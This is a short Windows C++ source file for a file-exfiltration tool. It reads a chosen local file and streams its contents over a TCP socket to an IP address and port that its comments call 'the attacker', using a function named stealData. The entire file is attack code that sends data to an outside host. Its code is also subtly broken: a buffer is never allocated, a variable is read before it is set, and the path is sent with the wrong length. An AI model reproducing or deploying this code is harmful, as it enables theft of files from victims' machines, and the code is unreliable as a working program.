#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "Ws2_32.lib")

#include <iostream>
#include <WinSock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>

using namespace std;
int stealData(char *filePath, SOCKET Socket)
{
    int maxBuff = 256;
    char *nl = "\n";
    FILE *fp = fopen(filePath, "r");
    if (fp)
    {
        char c;
        do
        {
            int count = 0, buffSize = 0;
            char *buff;
            while (buffSize < maxBuff && c != EOF)
            {
                buff[count++] = c = fgetc(fp);
                buffSize += sizeof(buff[count]);
            }
            if (send(Socket, buff, buffSize, 0) == 0)
                perror("Faild to send buffer");

        } while (c != EOF);
        send(Socket, nl, sizeof(char), 0);
        fclose(fp);
        return 1;
    }
    else
    {
        perror("File not found");
        return 0;
    }
}

int main(int argc, char *args[])
{
    // server variables
    char *ip;
    int port;
    char *filePath;

    if (argc > 1)
    {
        // take from args
        ip = args[1];
        port = atoi(args[2]);
        filePath = args[3];
    }
    else
    {
        // hard code server variables
        ip = "";
        port = 0;
        filePath = "";
    }
    if (fopen(filePath, "r") == 0)
    {
        perror("File not found");
        ExitProcess(EXIT_FAILURE);
    }
    // winsock init
    WSADATA wsaData;
    SOCKADDR_IN addr;
    WORD DLLversion = MAKEWORD(2, 1);
    if (WSAStartup(DLLversion, &wsaData) != 0)
    {
        perror("Erorr, can't initiate winsock");
        ExitProcess(EXIT_FAILURE);
    }

    // create Socket
    SOCKET Socket = socket(AF_INET, SOCK_STREAM, 0);
    if (Socket < 0)
    {
        perror("Erorr, can't create socket");
        ExitProcess(EXIT_FAILURE);
    }
    // bind the socket
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    // connect to attacker
    connect(Socket, (SOCKADDR *)&addr, sizeof(addr));

    // start sending
    send(Socket, filePath, sizeof(filePath), 0);
    send(Socket, "\n", 1, 0);

    stealData(filePath, Socket);

    // close the connection
    closesocket(Socket);
    WSACleanup();
    ExitProcess(EXIT_SUCCESS);
}